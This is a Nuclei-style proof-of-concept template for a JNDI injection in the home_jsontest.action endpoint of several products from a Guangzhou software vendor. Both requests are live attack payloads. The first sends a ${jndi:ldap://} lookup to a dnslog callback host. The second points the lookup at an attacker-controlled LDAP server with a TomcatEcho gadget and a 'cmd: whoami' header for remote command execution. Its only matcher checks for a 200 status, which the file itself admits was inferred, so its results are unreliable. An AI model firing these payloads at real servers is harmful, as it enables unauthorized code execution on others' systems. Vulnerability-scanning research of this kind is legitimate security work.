id: poc-aa32d25863f0415418e1
info:
  name: 速达软件技术（广州）有限公司多款产品home_jsontest存在JNID注入漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: other,2025
http:
- raw:
  - 'GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://56tcas.dnslog.cn} HTTP/1.1

    Host: {{Hostname}}

    Upgrade-Insecure-Requests: 1

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC

    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /login/home_jsontest.action?reqType=json&ISLOGIN=TRUE&eid=1&msg=1&errNo=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1

    Host: {{Hostname}}

    Upgrade-Insecure-Requests: 1

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    cmd: whoami

    Accept-Language: zh-CN,zh;q=0.9

    Cookie: JSESSIONID=96BFB09D9ED705FAF1EFD3CF45ECFFFC

    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
